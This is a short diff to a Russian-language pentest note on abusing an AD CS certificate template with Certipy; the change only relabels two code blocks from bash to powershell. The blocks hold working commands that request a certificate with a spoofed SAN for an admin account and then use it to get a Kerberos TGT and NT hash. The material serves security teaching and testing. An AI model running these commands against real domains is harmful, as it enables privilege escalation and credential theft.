@@ -32,12 +32,12 @@
 # Эксплуатация
 Для эксплуатации можно использовать определенные инструменты, например Certipy.
 1) Запрос сертификата с поддельным `SAN` для УЗ `victim_adm@PENTEST.LOCAL` пользователем `hacker` :
-	```bash
+	```powershell
 	certipy req -u hacker -p <password> -target PENTEST.LOCAL -dc-ip <dc_ip> -ca Antique_CA -template ForClient -upn victim_adm@PENTEST.LOCAL
 	```
 	Если все успешно то злоумышленник получает файл сертификата и закрытый ключ, например `hacked.pfx`.
 2) Аутентификация с полученным сертификатом `hacked.pfx` (например для Kerberos)
-	```bash
+	```powershell
 	certipy auth -pfx hacked.pfx -username victim_adm -domain PENTEST.LOCAL -dc-ip <dc_ip> -ptt
 	```
 	В результате злоумышленник получает TGT УЗ  `victim_adm`, Kerberos-билет в формате `.ccache` и NT-хеш пользователя.
